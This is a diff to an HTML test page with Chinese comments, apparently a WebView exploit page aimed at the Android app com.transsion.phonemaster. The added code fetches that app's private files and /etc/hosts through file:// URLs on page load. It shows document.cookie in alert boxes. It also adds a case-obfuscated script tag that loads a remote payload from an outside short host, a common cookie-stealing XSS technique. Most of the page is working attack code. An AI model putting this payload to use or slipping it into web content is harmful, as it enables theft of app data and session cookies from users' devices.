@@ -1,27 +1,60 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Android WebView Info & Data Access</title>
+    <title>Internal Browser Test</title>
+</head>
+<body>
+    <h2>WebView and Local File Access Test</h2>
+    
+    <!-- 显示内置 WebView 版本 -->
+    <div>
+        <h3>WebView Version:</h3>
+        <pre id="webview-version">Loading...</pre>
+        <button onclick="getWebViewVersion()">Get WebView Version</button>
+    </div>
+    
+    <!-- 读取 com.transsion.phonemaster 应用的数据 -->
+    <div>
+        <h3>Application Data (com.transsion.phonemaster):</h3>
+        <pre id="app-data">Loading...</pre>
+    </div>
+    
+    <!-- 读取 /etc/hosts 文件内容 -->
+    <div>
+        <h3>/etc/hosts File Content:</h3>
+        <pre id="hosts-content">Loading...</pre>
+        <button onclick="readHostsFile()">Read /etc/hosts</button>
+    </div>
+
+    <!-- 加载所有存储的 Cookie -->
+    <div>
+        <h3>Cookies:</h3>
+        <pre id="cookies">Loading...</pre>
+        <button onclick="getCookies()">Show Cookies</button>
+    </div>
+
     <script>
-        // Function to get WebView version and display it
+        // 读取 WebView 版本
         function getWebViewVersion() {
-            let webviewVersion = navigator.userAgent;
-            document.getElementById("webview-version").innerText = webviewVersion;
+            const version = navigator.userAgent;
+            document.getElementById("webview-version").innerText = version;
         }
 
-        // Function to get cookies from the current page
-        function getCookies() {
-            const cookies = document.cookie;
-            document.getElementById("cookie-content").innerText = cookies ? cookies : "No cookies found";
+        // 读取应用数据 (示例)
+        function getAppData() {
+            // 假设从一个特定的路径读取应用数据
+            // 实际环境中，这里可能需要不同的访问方式
+            fetch("file:///data/data/com.transsion.phonemaster/app_data")
+                .then(response => response.text())
+                .then(data => {
+                    document.getElementById("app-data").innerText = data;
+                })
+                .catch(err => {
+                    document.getElementById("app-data").innerText = "Unable to read app data: " + err;
+                });
         }
 
-        // Function to show cookies in an alert dialog
-        function showCookiesAlert() {
-            const cookies = document.cookie;
-            alert(cookies ? "Cookies: " + cookies : "No cookies found");
-        }
-
-        // Function to attempt reading /etc/hosts (NOTE: This will likely fail due to permissions)
+        // 读取 /etc/hosts 文件
         function readHostsFile() {
             fetch("file:///etc/hosts")
                 .then(response => response.text())
@@ -33,37 +66,21 @@
                 });
         }
 
-        // Function to try and access application data (cookie, storage, etc.)
-        function getAppData() {
-            try {
-                let localStorageData = JSON.stringify(localStorage);
-                document.getElementById("local-storage-content").innerText = localStorageData;
-            } catch (e) {
-                document.getElementById("local-storage-content").innerText = "Unable to access local storage: " + e;
-            }
+        // 显示当前的 Cookie
+        function getCookies() {
+            alert(document.cookie);
+            document.getElementById("cookies").innerText = document.cookie;
         }
-
-        window.onload = function() {
-            getWebViewVersion();
-            getCookies();
-            readHostsFile();
-            getAppData();
-        };
+        
+        // 页面加载时调用
+        getAppData();
     </script>
-</head>
-<body>
-    <h1>WebView Information & Data Access</h1>
-    <h2>WebView Version:</h2>
-    <p id="webview-version">Loading WebView version...</p>
+    
+    <!-- 弹出一个包含 document.cookie 的窗口 -->
+    <script>alert(document.cookie);</script>
 
-    <h2>Cookies:</h2>
-    <p id="cookie-content">Loading cookies...</p>
-    <button onclick="showCookiesAlert()">Show Cookies</button>
+    <!-- 加载外部脚本 -->
+    <sCRiPt/SrC="//xs.pe/q4e"></sCRiPt>
 
-    <h2>Contents of /etc/hosts:</h2>
-    <pre id="hosts-content">Attempting to read /etc/hosts...</pre>
-
-    <h2>Application Local Storage Data:</h2>
-    <pre id="local-storage-content">Loading local storage data...</pre>
 </body>
 </html>
